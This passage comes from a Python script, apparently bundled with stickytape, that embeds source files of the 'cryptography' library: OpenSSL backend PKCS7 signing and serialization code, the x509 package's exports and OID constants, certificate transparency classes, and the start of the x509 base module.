self._ffi.NULL:\r\n            self._consume_errors()\r\n            raise ValueError("Unable to parse PKCS7 data")\r\n\r\n        p7 = self._ffi.gc(p7, self._lib.PKCS7_free)\r\n        return self._load_pkcs7_certificates(p7)\r\n\r\n    def load_der_pkcs7_certificates(\r\n        self, data: bytes\r\n    ) -> typing.List[x509.Certificate]:\r\n        utils._check_bytes("data", data)\r\n        bio = self._bytes_to_bio(data)\r\n        p7 = self._lib.d2i_PKCS7_bio(bio.bio, self._ffi.NULL)\r\n        if p7 == self._ffi.NULL:\r\n            self._consume_errors()\r\n            raise ValueError("Unable to parse PKCS7 data")\r\n\r\n        p7 = self._ffi.gc(p7, self._lib.PKCS7_free)\r\n        return self._load_pkcs7_certificates(p7)\r\n\r\n    def _load_pkcs7_certificates(self, p7):\r\n        nid = self._lib.OBJ_obj2nid(p7.type)\r\n        self.openssl_assert(nid != self._lib.NID_undef)\r\n        if nid != self._lib.NID_pkcs7_signed:\r\n            raise UnsupportedAlgorithm(\r\n                "Only basic signed structures are currently supported. NID"\r\n                " for this data was {}".format(nid),\r\n                _Reasons.UNSUPPORTED_SERIALIZATION,\r\n            )\r\n\r\n        sk_x509 = p7.d.sign.cert\r\n        num = self._lib.sk_X509_num(sk_x509)\r\n        certs = []\r\n        for i in range(num):\r\n            x509 = self._lib.sk_X509_value(sk_x509, i)\r\n            self.openssl_assert(x509 != self._ffi.NULL)\r\n            res = self._lib.X509_up_ref(x509)\r\n            # When OpenSSL is less than 1.1.0 up_ref returns the current\r\n            # refcount. On 1.1.0+ it returns 1 for success.\r\n            self.openssl_assert(res >= 1)\r\n            x509 = self._ffi.gc(x509, self._lib.X509_free)\r\n            cert = self._ossl2cert(x509)\r\n            certs.append(cert)\r\n\r\n        return certs\r\n\r\n    def pkcs7_serialize_certificates(\r\n        self,\r\n        certs: typing.List[x509.Certificate],\r\n        encoding: serialization.Encoding,\r\n    ):\r\n        certs = list(certs)\r\n        if not certs or not all(\r\n            isinstance(cert, x509.Certificate) for cert in certs\r\n        ):\r\n            raise TypeError("certs must be a list of certs with length >= 1")\r\n\r\n        if encoding not in (\r\n            serialization.Encoding.PEM,\r\n            serialization.Encoding.DER,\r\n        ):\r\n            raise TypeError("encoding must DER or PEM from the Encoding enum")\r\n\r\n        certs_sk = self._lib.sk_X509_new_null()\r\n        certs_sk = self._ffi.gc(certs_sk, self._lib.sk_X509_free)\r\n        # This list is to keep the x509 values alive until end of function\r\n        ossl_certs = []\r\n        for cert in certs:\r\n            ossl_cert = self._cert2ossl(cert)\r\n            ossl_certs.append(ossl_cert)\r\n            res = self._lib.sk_X509_push(certs_sk, ossl_cert)\r\n            self.openssl_assert(res >= 1)\r\n        # We use PKCS7_sign here because it creates the PKCS7 and PKCS7_SIGNED\r\n        # structures for us rather than requiring manual assignment.\r\n        p7 = self._lib.PKCS7_sign(\r\n            self._ffi.NULL,\r\n            self._ffi.NULL,\r\n            certs_sk,\r\n            self._ffi.NULL,\r\n            self._lib.PKCS7_PARTIAL,\r\n        )\r\n        bio_out = self._create_mem_bio_gc()\r\n        if encoding is serialization.Encoding.PEM:\r\n            res = self._lib.PEM_write_bio_PKCS7_stream(\r\n                bio_out, p7, self._ffi.NULL, 0\r\n            )\r\n        else:\r\n            assert encoding is serialization.Encoding.DER\r\n            res = self._lib.i2d_PKCS7_bio(bio_out, p7)\r\n\r\n        self.openssl_assert(res == 1)\r\n        return self._read_mem_bio(bio_out)\r\n\r\n    def pkcs7_sign(\r\n        self,\r\n        builder: pkcs7.PKCS7SignatureBuilder,\r\n        encoding: serialization.Encoding,\r\n        options: typing.List[pkcs7.PKCS7Options],\r\n    ) -> bytes:\r\n        assert builder._data is not None\r\n        bio = self._bytes_to_bio(builder._data)\r\n        init_flags = self._lib.PKCS7_PARTIAL\r\n        final_flags = 0\r\n\r\n        if len(builder._additional_certs) == 0:\r\n            certs = self._ffi.NULL\r\n        else:\r\n            certs = self._lib.sk_X509_new_null()\r\n            certs = self._ffi.gc(certs, self._lib.sk_X509_free)\r\n            # This list is to keep the x509 values alive until end of function\r\n            ossl_certs = []\r\n            for cert in builder._additional_certs:\r\n                ossl_cert = self._cert2ossl(cert)\r\n                ossl_certs.append(ossl_cert)\r\n                res = self._lib.sk_X509_push(certs, ossl_cert)\r\n                self.openssl_assert(res >= 1)\r\n\r\n        if pkcs7.PKCS7Options.DetachedSignature in options:\r\n            # Don\'t embed the data in the PKCS7 structure\r\n            init_flags |= self._lib.PKCS7_DETACHED\r\n            final_flags |= self._lib.PKCS7_DETACHED\r\n\r\n        # This just inits a structure for us. However, there\r\n        # are flags we need to set, joy.\r\n        p7 = self._lib.PKCS7_sign(\r\n            self._ffi.NULL,\r\n            self._ffi.NULL,\r\n            certs,\r\n            self._ffi.NULL,\r\n            init_flags,\r\n        )\r\n        self.openssl_assert(p7 != self._ffi.NULL)\r\n        p7 = self._ffi.gc(p7, self._lib.PKCS7_free)\r\n        signer_flags = 0\r\n        # These flags are configurable on a per-signature basis\r\n        # but we\'ve deliberately chosen to make the API only allow\r\n        # setting it across all signatures for now.\r\n        if pkcs7.PKCS7Options.NoCapabilities in options:\r\n            signer_flags |= self._lib.PKCS7_NOSMIMECAP\r\n        elif pkcs7.PKCS7Options.NoAttributes in options:\r\n            signer_flags |= self._lib.PKCS7_NOATTR\r\n\r\n        if pkcs7.PKCS7Options.NoCerts in options:\r\n            signer_flags |= self._lib.PKCS7_NOCERTS\r\n\r\n        for certificate, private_key, hash_algorithm in builder._signers:\r\n            ossl_cert = self._cert2ossl(certificate)\r\n            md = self._evp_md_non_null_from_algorithm(hash_algorithm)\r\n            p7signerinfo = self._lib.PKCS7_sign_add_signer(\r\n                p7,\r\n                ossl_cert,\r\n                private_key._evp_pkey,  # type: ignore[union-attr]\r\n                md,\r\n                signer_flags,\r\n            )\r\n            self.openssl_assert(p7signerinfo != self._ffi.NULL)\r\n\r\n        for option in options:\r\n            # DetachedSignature, NoCapabilities, and NoAttributes are already\r\n            # handled so we just need to check these last two options.\r\n            if option is pkcs7.PKCS7Options.Text:\r\n                final_flags |= self._lib.PKCS7_TEXT\r\n            elif option is pkcs7.PKCS7Options.Binary:\r\n                final_flags |= self._lib.PKCS7_BINARY\r\n\r\n        bio_out = self._create_mem_bio_gc()\r\n        if encoding is serialization.Encoding.SMIME:\r\n            # This finalizes the structure\r\n            res = self._lib.SMIME_write_PKCS7(\r\n                bio_out, p7, bio.bio, final_flags\r\n            )\r\n        elif encoding is serialization.Encoding.PEM:\r\n            res = self._lib.PKCS7_final(p7, bio.bio, final_flags)\r\n            self.openssl_assert(res == 1)\r\n            res = self._lib.PEM_write_bio_PKCS7_stream(\r\n                bio_out, p7, bio.bio, final_flags\r\n            )\r\n        else:\r\n            assert encoding is serialization.Encoding.DER\r\n            # We need to call finalize here becauase i2d_PKCS7_bio does not\r\n            # finalize.\r\n            res = self._lib.PKCS7_final(p7, bio.bio, final_flags)\r\n            self.openssl_assert(res == 1)\r\n            # OpenSSL 3.0 leaves a random bio error on the stack:\r\n            # https://github.com/openssl/openssl/issues/16681\r\n            if self._lib.CRYPTOGRAPHY_OPENSSL_300_OR_GREATER:\r\n                self._consume_errors()\r\n            res = self._lib.i2d_PKCS7_bio(bio_out, p7)\r\n        self.openssl_assert(res == 1)\r\n        return self._read_mem_bio(bio_out)\r\n\r\n\r\nclass GetCipherByName:\r\n    def __init__(self, fmt: str):\r\n        self._fmt = fmt\r\n\r\n    def __call__(self, backend: Backend, cipher: CipherAlgorithm, mode: Mode):\r\n        cipher_name = self._fmt.format(cipher=cipher, mode=mode).lower()\r\n        return backend._lib.EVP_get_cipherbyname(cipher_name.encode("ascii"))\r\n\r\n\r\ndef _get_xts_cipher(backend: Backend, cipher: AES, mode):\r\n    cipher_name = "aes-{}-xts".format(cipher.key_size // 2)\r\n    return backend._lib.EVP_get_cipherbyname(cipher_name.encode("ascii"))\r\n\r\n\r\nbackend = Backend()\r\n')
    __stickytape_write_module('cryptography/x509/__init__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nfrom cryptography.x509 import certificate_transparency\r\nfrom cryptography.x509.base import (\r\n    Attribute,\r\n    AttributeNotFound,\r\n    Attributes,\r\n    Certificate,\r\n    CertificateBuilder,\r\n    CertificateRevocationList,\r\n    CertificateRevocationListBuilder,\r\n    CertificateSigningRequest,\r\n    CertificateSigningRequestBuilder,\r\n    InvalidVersion,\r\n    RevokedCertificate,\r\n    RevokedCertificateBuilder,\r\n    Version,\r\n    load_der_x509_certificate,\r\n    load_der_x509_crl,\r\n    load_der_x509_csr,\r\n    load_pem_x509_certificate,\r\n    load_pem_x509_crl,\r\n    load_pem_x509_csr,\r\n    random_serial_number,\r\n)\r\nfrom cryptography.x509.extensions import (\r\n    AccessDescription,\r\n    AuthorityInformationAccess,\r\n    AuthorityKeyIdentifier,\r\n    BasicConstraints,\r\n    CRLDistributionPoints,\r\n    CRLNumber,\r\n    CRLReason,\r\n    CertificateIssuer,\r\n    CertificatePolicies,\r\n    DeltaCRLIndicator,\r\n    DistributionPoint,\r\n    DuplicateExtension,\r\n    ExtendedKeyUsage,\r\n    Extension,\r\n    ExtensionNotFound,\r\n    ExtensionType,\r\n    Extensions,\r\n    FreshestCRL,\r\n    GeneralNames,\r\n    InhibitAnyPolicy,\r\n    InvalidityDate,\r\n    IssuerAlternativeName,\r\n    IssuingDistributionPoint,\r\n    KeyUsage,\r\n    NameConstraints,\r\n    NoticeReference,\r\n    OCSPNoCheck,\r\n    OCSPNonce,\r\n    PolicyConstraints,\r\n    PolicyInformation,\r\n    PrecertPoison,\r\n    PrecertificateSignedCertificateTimestamps,\r\n    ReasonFlags,\r\n    SignedCertificateTimestamps,\r\n    SubjectAlternativeName,\r\n    SubjectInformationAccess,\r\n    SubjectKeyIdentifier,\r\n    TLSFeature,\r\n    TLSFeatureType,\r\n    UnrecognizedExtension,\r\n    UserNotice,\r\n)\r\nfrom cryptography.x509.general_name import (\r\n    DNSName,\r\n    DirectoryName,\r\n    GeneralName,\r\n    IPAddress,\r\n    OtherName,\r\n    RFC822Name,\r\n    RegisteredID,\r\n    UniformResourceIdentifier,\r\n    UnsupportedGeneralNameType,\r\n)\r\nfrom cryptography.x509.name import (\r\n    Name,\r\n    NameAttribute,\r\n    RelativeDistinguishedName,\r\n)\r\nfrom cryptography.x509.oid import (\r\n    AuthorityInformationAccessOID,\r\n    CRLEntryExtensionOID,\r\n    CertificatePoliciesOID,\r\n    ExtendedKeyUsageOID,\r\n    ExtensionOID,\r\n    NameOID,\r\n    ObjectIdentifier,\r\n    SignatureAlgorithmOID,\r\n)\r\n\r\n\r\nOID_AUTHORITY_INFORMATION_ACCESS = ExtensionOID.AUTHORITY_INFORMATION_ACCESS\r\nOID_AUTHORITY_KEY_IDENTIFIER = ExtensionOID.AUTHORITY_KEY_IDENTIFIER\r\nOID_BASIC_CONSTRAINTS = ExtensionOID.BASIC_CONSTRAINTS\r\nOID_CERTIFICATE_POLICIES = ExtensionOID.CERTIFICATE_POLICIES\r\nOID_CRL_DISTRIBUTION_POINTS = ExtensionOID.CRL_DISTRIBUTION_POINTS\r\nOID_EXTENDED_KEY_USAGE = ExtensionOID.EXTENDED_KEY_USAGE\r\nOID_FRESHEST_CRL = ExtensionOID.FRESHEST_CRL\r\nOID_INHIBIT_ANY_POLICY = ExtensionOID.INHIBIT_ANY_POLICY\r\nOID_ISSUER_ALTERNATIVE_NAME = ExtensionOID.ISSUER_ALTERNATIVE_NAME\r\nOID_KEY_USAGE = ExtensionOID.KEY_USAGE\r\nOID_NAME_CONSTRAINTS = ExtensionOID.NAME_CONSTRAINTS\r\nOID_OCSP_NO_CHECK = ExtensionOID.OCSP_NO_CHECK\r\nOID_POLICY_CONSTRAINTS = ExtensionOID.POLICY_CONSTRAINTS\r\nOID_POLICY_MAPPINGS = ExtensionOID.POLICY_MAPPINGS\r\nOID_SUBJECT_ALTERNATIVE_NAME = ExtensionOID.SUBJECT_ALTERNATIVE_NAME\r\nOID_SUBJECT_DIRECTORY_ATTRIBUTES = ExtensionOID.SUBJECT_DIRECTORY_ATTRIBUTES\r\nOID_SUBJECT_INFORMATION_ACCESS = ExtensionOID.SUBJECT_INFORMATION_ACCESS\r\nOID_SUBJECT_KEY_IDENTIFIER = ExtensionOID.SUBJECT_KEY_IDENTIFIER\r\n\r\nOID_DSA_WITH_SHA1 = SignatureAlgorithmOID.DSA_WITH_SHA1\r\nOID_DSA_WITH_SHA224 = SignatureAlgorithmOID.DSA_WITH_SHA224\r\nOID_DSA_WITH_SHA256 = SignatureAlgorithmOID.DSA_WITH_SHA256\r\nOID_ECDSA_WITH_SHA1 = SignatureAlgorithmOID.ECDSA_WITH_SHA1\r\nOID_ECDSA_WITH_SHA224 = SignatureAlgorithmOID.ECDSA_WITH_SHA224\r\nOID_ECDSA_WITH_SHA256 = SignatureAlgorithmOID.ECDSA_WITH_SHA256\r\nOID_ECDSA_WITH_SHA384 = SignatureAlgorithmOID.ECDSA_WITH_SHA384\r\nOID_ECDSA_WITH_SHA512 = SignatureAlgorithmOID.ECDSA_WITH_SHA512\r\nOID_RSA_WITH_MD5 = SignatureAlgorithmOID.RSA_WITH_MD5\r\nOID_RSA_WITH_SHA1 = SignatureAlgorithmOID.RSA_WITH_SHA1\r\nOID_RSA_WITH_SHA224 = SignatureAlgorithmOID.RSA_WITH_SHA224\r\nOID_RSA_WITH_SHA256 = SignatureAlgorithmOID.RSA_WITH_SHA256\r\nOID_RSA_WITH_SHA384 = SignatureAlgorithmOID.RSA_WITH_SHA384\r\nOID_RSA_WITH_SHA512 = SignatureAlgorithmOID.RSA_WITH_SHA512\r\nOID_RSASSA_PSS = SignatureAlgorithmOID.RSASSA_PSS\r\n\r\nOID_COMMON_NAME = NameOID.COMMON_NAME\r\nOID_COUNTRY_NAME = NameOID.COUNTRY_NAME\r\nOID_DOMAIN_COMPONENT = NameOID.DOMAIN_COMPONENT\r\nOID_DN_QUALIFIER = NameOID.DN_QUALIFIER\r\nOID_EMAIL_ADDRESS = NameOID.EMAIL_ADDRESS\r\nOID_GENERATION_QUALIFIER = NameOID.GENERATION_QUALIFIER\r\nOID_GIVEN_NAME = NameOID.GIVEN_NAME\r\nOID_LOCALITY_NAME = NameOID.LOCALITY_NAME\r\nOID_ORGANIZATIONAL_UNIT_NAME = NameOID.ORGANIZATIONAL_UNIT_NAME\r\nOID_ORGANIZATION_NAME = NameOID.ORGANIZATION_NAME\r\nOID_PSEUDONYM = NameOID.PSEUDONYM\r\nOID_SERIAL_NUMBER = NameOID.SERIAL_NUMBER\r\nOID_STATE_OR_PROVINCE_NAME = NameOID.STATE_OR_PROVINCE_NAME\r\nOID_SURNAME = NameOID.SURNAME\r\nOID_TITLE = NameOID.TITLE\r\n\r\nOID_CLIENT_AUTH = ExtendedKeyUsageOID.CLIENT_AUTH\r\nOID_CODE_SIGNING = ExtendedKeyUsageOID.CODE_SIGNING\r\nOID_EMAIL_PROTECTION = ExtendedKeyUsageOID.EMAIL_PROTECTION\r\nOID_OCSP_SIGNING = ExtendedKeyUsageOID.OCSP_SIGNING\r\nOID_SERVER_AUTH = ExtendedKeyUsageOID.SERVER_AUTH\r\nOID_TIME_STAMPING = ExtendedKeyUsageOID.TIME_STAMPING\r\n\r\nOID_ANY_POLICY = CertificatePoliciesOID.ANY_POLICY\r\nOID_CPS_QUALIFIER = CertificatePoliciesOID.CPS_QUALIFIER\r\nOID_CPS_USER_NOTICE = CertificatePoliciesOID.CPS_USER_NOTICE\r\n\r\nOID_CERTIFICATE_ISSUER = CRLEntryExtensionOID.CERTIFICATE_ISSUER\r\nOID_CRL_REASON = CRLEntryExtensionOID.CRL_REASON\r\nOID_INVALIDITY_DATE = CRLEntryExtensionOID.INVALIDITY_DATE\r\n\r\nOID_CA_ISSUERS = AuthorityInformationAccessOID.CA_ISSUERS\r\nOID_OCSP = AuthorityInformationAccessOID.OCSP\r\n\r\n__all__ = [\r\n    "certificate_transparency",\r\n    "load_pem_x509_certificate",\r\n    "load_der_x509_certificate",\r\n    "load_pem_x509_csr",\r\n    "load_der_x509_csr",\r\n    "load_pem_x509_crl",\r\n    "load_der_x509_crl",\r\n    "random_serial_number",\r\n    "Attribute",\r\n    "AttributeNotFound",\r\n    "Attributes",\r\n    "InvalidVersion",\r\n    "DeltaCRLIndicator",\r\n    "DuplicateExtension",\r\n    "ExtensionNotFound",\r\n    "UnsupportedGeneralNameType",\r\n    "NameAttribute",\r\n    "Name",\r\n    "RelativeDistinguishedName",\r\n    "ObjectIdentifier",\r\n    "ExtensionType",\r\n    "Extensions",\r\n    "Extension",\r\n    "ExtendedKeyUsage",\r\n    "FreshestCRL",\r\n    "IssuingDistributionPoint",\r\n    "TLSFeature",\r\n    "TLSFeatureType",\r\n    "OCSPNoCheck",\r\n    "BasicConstraints",\r\n    "CRLNumber",\r\n    "KeyUsage",\r\n    "AuthorityInformationAccess",\r\n    "SubjectInformationAccess",\r\n    "AccessDescription",\r\n    "CertificatePolicies",\r\n    "PolicyInformation",\r\n    "UserNotice",\r\n    "NoticeReference",\r\n    "SubjectKeyIdentifier",\r\n    "NameConstraints",\r\n    "CRLDistributionPoints",\r\n    "DistributionPoint",\r\n    "ReasonFlags",\r\n    "InhibitAnyPolicy",\r\n    "SubjectAlternativeName",\r\n    "IssuerAlternativeName",\r\n    "AuthorityKeyIdentifier",\r\n    "GeneralNames",\r\n    "GeneralName",\r\n    "RFC822Name",\r\n    "DNSName",\r\n    "UniformResourceIdentifier",\r\n    "RegisteredID",\r\n    "DirectoryName",\r\n    "IPAddress",\r\n    "OtherName",\r\n    "Certificate",\r\n    "CertificateRevocationList",\r\n    "CertificateRevocationListBuilder",\r\n    "CertificateSigningRequest",\r\n    "RevokedCertificate",\r\n    "RevokedCertificateBuilder",\r\n    "CertificateSigningRequestBuilder",\r\n    "CertificateBuilder",\r\n    "Version",\r\n    "OID_CA_ISSUERS",\r\n    "OID_OCSP",\r\n    "CertificateIssuer",\r\n    "CRLReason",\r\n    "InvalidityDate",\r\n    "UnrecognizedExtension",\r\n    "PolicyConstraints",\r\n    "PrecertificateSignedCertificateTimestamps",\r\n    "PrecertPoison",\r\n    "OCSPNonce",\r\n    "SignedCertificateTimestamps",\r\n    "SignatureAlgorithmOID",\r\n    "NameOID",\r\n]\r\n')
    __stickytape_write_module('cryptography/x509/certificate_transparency.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\nimport datetime\r\n\r\nfrom cryptography import utils\r\nfrom cryptography.hazmat.bindings._rust import x509 as rust_x509\r\n\r\n\r\nclass LogEntryType(utils.Enum):\r\n    X509_CERTIFICATE = 0\r\n    PRE_CERTIFICATE = 1\r\n\r\n\r\nclass Version(utils.Enum):\r\n    v1 = 0\r\n\r\n\r\nclass SignedCertificateTimestamp(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def version(self) -> Version:\r\n        """\r\n        Returns the SCT version.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def log_id(self) -> bytes:\r\n        """\r\n        Returns an identifier indicating which log this SCT is for.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def timestamp(self) -> datetime.datetime:\r\n        """\r\n        Returns the timestamp for this SCT.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def entry_type(self) -> LogEntryType:\r\n        """\r\n        Returns whether this is an SCT for a certificate or pre-certificate.\r\n        """\r\n\r\n\r\nSignedCertificateTimestamp.register(rust_x509.Sct)\r\n')
    __stickytape_write_module('cryptography/hazmat/bindings/__init__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n')
    __stickytape_write_module('cryptography/x509/base.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\nimport datetime\r\nimport os\r\nimport typing\r\n\r\nfrom cryptography import utils\r\nfrom cryptography.hazmat.bindings._rust import x509 as rust_x509\r\nfrom cryptography.hazmat.primitives import hashes, serialization\r\nfrom cryptography.hazmat.primitives.asymmetric import (\r\n    dsa,\r\n    ec,\r\n    ed25519,\r\n    ed448,\r\n    rsa,\r\n    x25519,\r\n    x448,\r\n)\r\nfrom cryptography.hazmat.primitives.asymmetric.types import (\r\n    CERTIFICATE_ISSUER_PUBLIC_KEY_TYPES,\r\n    CERTIFICATE_PRIVATE_KEY_TYPES,\r\n    CERTIFICATE_PUBLIC_KEY_TYPES,\r\n)\r\nfrom cryptography.x509.extensions import (\r\n    Extension,\r\n    ExtensionType,\r\n    Extensions,\r\n    _make_sequence_methods,\r\n)\r\nfrom cryptography.x509.name import Name, _ASN1Type\r\nfrom cryptography.x509.oid import ObjectIdentifier\r\n\r\n\r\n_EARLIEST_UTC_TIME = datetime.datetime(1950, 1, 1)\r\n\r\n\r\nclass AttributeNotFound(Exception):\r\n    def __init__(self, msg: str, oid: ObjectIdentifier) -> None:\r\n        super(AttributeNotFound, self).__init__(msg)\r\n        self.oid = oid\r\n\r\n\r\ndef _reject_duplicate_extension(\r\n    extension: Extension[ExtensionType],\r\n    extensions: typing.List[Extension[ExtensionType]],\r\n) -> None:\r\n    # This is quadratic in the number of extensions\r\n    for e in extensions:\r\n        if e.oid == extension.oid:\r\n            raise ValueError("This extension has already been set.")\r\n\r\n\r\ndef _reject_duplicate_attribute(\r\n    oid: ObjectIdentifier,\r\n    attributes: typing.List[\r\n        typing.Tuple[ObjectIdentifier, bytes, typing.Optional[int]]\r\n    ],\r\n) -> None:\r\n    # This is quadratic in the number of attributes\r\n    for attr_oid, _, _ in attributes:\r\n        if attr_oid == oid:\r\n            raise ValueError("This attribute has already been set.")\r\n\r\n\r\ndef _convert_to_naive_utc_time(time: datetime.datetime) -> datetime.datetime:\r\n    """Normalizes a datetime to a naive datetime in UTC.\r\n\r\n    time -- datetime to normalize. Assumed to be in UTC if not timezone\r\n            aware.\r\n    """\r\n    if time.tzinfo is not None:\r\n        offset = time.utcoffset()\r\n        offset = offset if offset else datetime.timedelta()\r\n        return time.replace(tzinfo=None) - offset\r\n    else:\r\n        return time\r\n\r\n\r\nclass Attribute:\r\n    def __init__(\r\n        self,\r\n        oid: ObjectIdentifier,\r\n        value: bytes,\r\n        _type: int = _ASN1Type.UTF8String.value,\r\n    ) -> None:\r\n        self._oid = oid\r\n        self._value = value\r\n        self._type = _type\r\n\r\n    @property\r\n    def oid(self) -> ObjectIdentifier:\r\n        return self._oid\r\n\r\n    @property\r\n    def value(self) -> bytes:\r\n        return self._value\r\n\r\n    def __repr__(self) -> str:\r\n        return "<Attribute(oid={}, value={!r})>".format(self.oid, self.value)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, Attribute):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.oid == other.oid\r\n            and self.value == other.value\r\n            and self._type == other._type\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.oid, self.value, self._type))\r\n\r\n\r\nclass Attributes:\r\n    def __init__(\r\n        self,\r\n        attributes: typing.Iterable[Attribute],\r\n    ) -> None:\r\n        self._attributes = list(attributes)\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods("_attributes")\r\n\r\n    def __repr__(self) -> str:\r\n        return "<Attributes({})>".format(self._attributes)\r\n\r\n    def get_attribute_for_oid(self, oid: ObjectIdentifier) -> Attribute:\r\n        for attr in self:\r\n            if attr.oid == oid:\r\n                return attr\r\n\r\n        raise AttributeNotFound("No {} attribute was found".format(oid), oid)\r\n\r\n\r\nclass Version(utils.Enum):\r\n    v1 = 0\r\n    v3 = 2\r\n\r\n\r\nclass InvalidVersion(Exception):\r\n    def __init__(self, msg: str, parsed_version: int) -> None:\r\n        super(InvalidVersion, self).__init__(msg)\r\n        self.parsed_version = parsed_version\r\n\r\n\r\nclass Certificate(metaclass=abc.ABCMeta):\r\n    @abc.abstractmethod\r\n    def fingerprint(self, algorithm: hashes.HashAlgorithm) -> bytes:\r\n        """\r\n        Returns bytes using digest passed.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def serial_number(self) -> int:\r\n        """\r\n        Returns certificate serial number\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def version(self) -> Version:\r\n        """\r\n        Returns the certificate version\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_key(self) -> CERTIFICATE_PUBLIC_KEY_TYPES:\r\n        """\r\n        Returns the public key\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def not_valid_before(self) -> datetime.datetime:\r\n        """\r\n        Not before time (represented as UTC datetime)\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def not_valid_after(self) -> datetime.datetime:\r\n        """\r\n        Not after time (represented as UTC datetime)\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def issuer(self) -> Name:\r\n        """\r\n        Returns the issuer name object.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def subject(self) -> Name:\r\n        """\r\n        Returns the subject name object.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def signature_hash_algorithm(\r\n        self,\r\n    ) -> typing.Optional[hashes.HashAlgorithm]:\r\n        """\r\n        Returns a HashAlgorithm corresponding to the type of the digest signed\r\n        in the certificate.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def signature_algorithm_oid(self) -> ObjectIdentifier:\r\n        """\r\n        Returns the ObjectIdentifier of the signature algorithm.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def extensions(self) -> Extensions:\r\n        """\r\n        Returns an Extensions object.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def signature(self) -> bytes:\r\n        """\r\n        Returns the signature bytes.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def tbs_certificate_bytes(self) -> bytes:\r\n        """\r\n        Returns the tbsCertificate payload bytes as defined in RFC 5280.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def __eq__(self, other: object) -> bool:\r\n        """\r\n        Checks equality.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def __hash__(self) -> int:\r\n        """\r\n        Computes a hash.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_bytes(self, encoding: serialization.Encoding) -> bytes:\r\n        """\r\n        Serializes the certificate to PEM or DER format.\r\n        """\r\n\r\n\r\n# Runtime isinstance checks need this since the rust class is not a subclass.\r\nCertificate.register(rust_x509.Certificate)\r\n\r\n\r\nclass RevokedCertificate(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def serial_number(self) -> int:\r\n        """\r\n        Returns the serial number of the revoked certificate.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def revocation_date(self) -> datetime.datetime:\r\n        """\r\n        Returns the date of when this certificate was revoked.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def extensions(self) -> Extensions:\r\n        """\r\n        Returns an Extensions object containing a list of Revoked extensions.\r\n        """\r\n\r\n\r\n# Runtime isinstance checks need this since the rust class is not a subclass.\r\nRevokedCertificate.register(rust_x509.RevokedCertificate)\r\n\r\n\r\nclass _RawRevokedCertificate(RevokedCertificate):\r\n    def __init__(\r\n        self,\r\n        serial_number: int,\r\n        revocation_date: datetime.datetime,\r\n        extensions: Extensions,\r\n    ):\r\n        self._serial_number = serial_number\r\n        self._revocation_date = revocation_date\r\n        self._extensions = extensions\r\n\r\n    @property\r\n    def serial_number(self) -> int:\r\n        return self._serial_number\r\n\r\n    @property\r\n    def revocation_date(self) -> datetime.datetime:\r\n        return self._revocation_date\r\n\r\n    @property\r\n    def extensions(self) -> Extensions:\r\n        return self._extensions\r\n\r\n\r\nclass CertificateRevocationList(metaclass=abc.ABCMeta):\r\n    @abc.abstractmethod\r\n    def public_bytes(self, encoding: serialization.Encoding) -> bytes:\r\n        """\r\n        Serializes the CRL to PEM or DER format.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def fingerprint(self, algorithm: hashes.HashAlgorithm) -> bytes:\r\n        """\r\n        Returns bytes using digest passed.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def get_revoked_certificate_by_serial_number(\r\n        self, serial_number: int\r\n    ) -> typing.Optional[RevokedCertificate]:\r\n        """\r\n        Returns an instance of RevokedCertificate or None if the serial_number\r\n        is not in the CRL.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def signature_hash_algorithm(\r\n        self,\r\n    ) -> typing.Optional[hashes.HashAlgorithm]:\r\n        """\r\n        Returns a HashAlgorithm corresponding to the type of the digest signed\r\n        in the certificate.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def signature_algorithm_oid(self) -> ObjectIdentifier:\r\n        """\r\n        Returns the ObjectIdentifier of the signature algorithm.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def issuer(self) -> Name:\r\n        """\r\n        Returns the X509Name with the issuer of this CRL.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def next_update(self) -> typing.Optional[datetime.datetime]:\r\n        """\r\n        Returns the date of next update for this CRL.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def last_update(self) -> datetime.datetime:\r\n        """\r\n        Returns the date of last update for this CRL.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def extensions(self) -> Extensions:\r\n        """\r\n        Returns an Extensions object containing a list of CRL extensions.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def signature(self) -> bytes:\r\n        """\r\n        Returns the signature bytes.\r\n        """\r\n\r\n    